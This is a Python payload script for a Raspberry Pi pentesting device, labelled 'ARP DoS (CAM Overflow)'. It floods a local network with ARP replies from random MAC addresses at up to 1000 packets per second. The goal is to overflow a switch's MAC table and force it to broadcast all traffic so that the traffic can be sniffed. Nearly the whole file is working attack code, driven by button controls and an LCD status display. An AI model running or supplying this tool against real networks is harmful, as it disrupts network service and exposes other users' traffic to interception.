#!/usr/bin/env python3
"""
RaspyJack Payload -- ARP DoS (CAM Overflow)
============================================
Author: 7h30th3r0n3

CAM table overflow / ARP flooding to force a switch into hub mode.
Sends massive ARP replies with random source MACs to overflow the
switch's MAC address table.  When the table overflows, the switch
broadcasts all traffic (hub mode), enabling passive sniffing.

Controls:
  OK         -- Start / Stop flooding
  UP / DOWN  -- Adjust speed (packets per burst)
  KEY1       -- Toggle interface (eth0 / wlan0)
  KEY3       -- Exit

Setup: No special requirements, uses scapy raw frames.
"""

import os
import sys
import time
import random
import threading
import subprocess
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

try:
    from scapy.all import Ether, ARP, sendp, conf
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
SPEED_LEVELS = [10, 50, 100, 500, 1000]
SPEED_NAMES = ["10/s", "50/s", "100/s", "500/s", "1000/s"]
IFACE_CHOICES = ["eth0", "wlan0"]

# Typical CAM table sizes: 2K-16K entries
ESTIMATED_CAM_SIZES = {"small": 2048, "medium": 8192, "large": 16384}
CAM_ESTIMATE = 8192

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
running = True
flooding = False
speed_idx = 2            # index into SPEED_LEVELS (default 100/s)
iface_idx = 0            # index into IFACE_CHOICES
packets_sent = 0
start_time = 0.0
pkt_per_sec = 0.0
status_msg = "Ready"

_flood_thread = None

# ---------------------------------------------------------------------------
# Network helpers
# ---------------------------------------------------------------------------

def _get_active_iface():
    """Return the first up interface from IFACE_CHOICES."""
    for iface in IFACE_CHOICES:
        try:
            with open(f"/sys/class/net/{iface}/operstate") as fh:
                if fh.read().strip() == "up":
                    return iface
        except Exception:
            pass
    return IFACE_CHOICES[0]


def _get_iface_ip(iface):
    """Read IPv4 address of our interface."""
    try:
        result = subprocess.run(
            ["ip", "-4", "addr", "show", "dev", iface],
            capture_output=True, text=True, timeout=5,
        )
        for line in result.stdout.splitlines():
            line = line.strip()
            if line.startswith("inet "):
                return line.split()[1].split("/")[0]
    except Exception:
        pass
    return "192.168.1.1"


def _get_subnet_base(ip):
    """Get /24 subnet base from IP."""
    parts = ip.split(".")
    if len(parts) == 4:
        return f"{parts[0]}.{parts[1]}.{parts[2]}"
    return "192.168.1"


def _random_mac():
    """Generate a random locally-administered unicast MAC."""
    octets = [random.randint(0, 255) for _ in range(6)]
    octets[0] = (octets[0] | 0x02) & 0xFE
    return ":".join(f"{b:02x}" for b in octets)


def _random_ip(subnet_base):
    """Generate a random IP in the /24 subnet."""
    return f"{subnet_base}.{random.randint(1, 254)}"


# ---------------------------------------------------------------------------
# Flood thread
# ---------------------------------------------------------------------------

def _flood_loop():
    """Send ARP replies with random MACs in bursts."""
    global packets_sent, pkt_per_sec, start_time

    iface = IFACE_CHOICES[iface_idx]
    my_ip = _get_iface_ip(iface)
    subnet_base = _get_subnet_base(my_ip)

    with lock:
        start_time = time.time()
        packets_sent = 0

    while running and flooding:
        burst_size = SPEED_LEVELS[speed_idx]
        burst_start = time.time()

        batch = []
        for _ in range(burst_size):
            if not running or not flooding:
                break
            src_mac = _random_mac()
            src_ip = _random_ip(subnet_base)
            dst_ip = _random_ip(subnet_base)

            pkt = (
                Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")
                / ARP(
                    op=2,
                    hwsrc=src_mac,
                    psrc=src_ip,
                    hwdst="ff:ff:ff:ff:ff:ff",
                    pdst=dst_ip,
                )
            )
            batch.append(pkt)

        if batch:
            try:
                sendp(batch, iface=iface, verbose=False)
                with lock:
                    packets_sent += len(batch)
            except Exception:
                pass

        elapsed = time.time() - burst_start
        with lock:
            total_elapsed = time.time() - start_time
            if total_elapsed > 0:
                pkt_per_sec = packets_sent / total_elapsed

        # Sleep remainder of 1 second if burst was fast
        sleep_time = max(0.01, 1.0 - elapsed)
        # Break sleep into small chunks for responsiveness
        chunks = int(sleep_time / 0.05)
        for _ in range(chunks):
            if not running or not flooding:
                break
            time.sleep(0.05)


# ---------------------------------------------------------------------------
# LCD rendering
# ---------------------------------------------------------------------------

def _draw_screen():
    """Render current state on LCD."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
    draw = ScaledDraw(img)

    draw.text((2, 2), "ARP DoS / CAM FLOOD", fill="RED", font=font)

    with lock:
        st = status_msg
        ps = packets_sent
        pps = pkt_per_sec
        fl = flooding
        spd = SPEED_NAMES[speed_idx]
        iface = IFACE_CHOICES[iface_idx]

    draw.text((2, 16), st[:22], fill="WHITE", font=font)
    draw.text((2, 30), f"Iface: {iface}", fill="GRAY", font=font)
    draw.text((2, 44), f"Speed: {spd}", fill="YELLOW", font=font)
    draw.text((2, 58), f"Sent: {ps}", fill="GREEN" if fl else "WHITE", font=font)
    draw.text((2, 72), f"Rate: {pps:.0f} pkt/s", fill="WHITE", font=font)

    # Estimated CAM fill
    fill_pct = min(100, (ps / CAM_ESTIMATE) * 100)
    bar_width = int(fill_pct * 1.0)
    fill_color = "GREEN"
    if fill_pct > 50:
        fill_color = "YELLOW"
    if fill_pct > 90:
        fill_color = "RED"
    draw.text((2, 86), f"CAM fill: ~{fill_pct:.0f}%", fill=fill_color, font=font)
    draw.rectangle((2, 98, 2 + bar_width, 104), fill=fill_color)
    draw.rectangle((2, 98, 102, 104), outline="GRAY")

    # Footer
    if fl:
        draw.text((2, 116), "OK:Stop U/D:Spd K3:Quit", fill="GRAY", font=font)
    else:
        draw.text((2, 116), "OK:Start U/D:Spd K3:Quit", fill="GRAY", font=font)

    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global running, flooding, speed_idx, iface_idx, status_msg
    global _flood_thread

    try:
        if not SCAPY_OK:
            img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
            draw = ScaledDraw(img)
            draw.text((4, 50), "scapy not found!", font=font, fill="RED")
            draw.text((4, 65), "pip install scapy", font=font, fill="GRAY")
            LCD.LCD_ShowImage(img, 0, 0)
            time.sleep(3)
            GPIO.cleanup()
            return 1

        # Auto-select active interface
        active = _get_active_iface()
        if active in IFACE_CHOICES:
            iface_idx = IFACE_CHOICES.index(active)

        with lock:
            status_msg = f"Ready on {IFACE_CHOICES[iface_idx]}"

        _draw_screen()

        while running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                running = False
                break

            elif btn == "OK":
                with lock:
                    flooding = not flooding
                if flooding:
                    with lock:
                        status_msg = "Flooding..."
                    _flood_thread = threading.Thread(
                        target=_flood_loop, daemon=True,
                    )
                    _flood_thread.start()
                else:
                    with lock:
                        status_msg = "Stopped"
                time.sleep(0.3)

            elif btn == "UP":
                with lock:
                    if speed_idx < len(SPEED_LEVELS) - 1:
                        speed_idx += 1
                        status_msg = f"Speed: {SPEED_NAMES[speed_idx]}"
                time.sleep(0.3)

            elif btn == "DOWN":
                with lock:
                    if speed_idx > 0:
                        speed_idx -= 1
                        status_msg = f"Speed: {SPEED_NAMES[speed_idx]}"
                time.sleep(0.3)

            elif btn == "KEY1":
                with lock:
                    if not flooding:
                        iface_idx = (iface_idx + 1) % len(IFACE_CHOICES)
                        status_msg = f"Iface: {IFACE_CHOICES[iface_idx]}"
                time.sleep(0.3)

            _draw_screen()
            time.sleep(0.15)

    finally:
        running = False
        flooding = False

        try:
            img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
            draw = ScaledDraw(img)
            draw.text((10, 50), "ARP DoS stopped", fill="YELLOW", font=font)
            LCD.LCD_ShowImage(img, 0, 0)
        except Exception:
            pass

        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
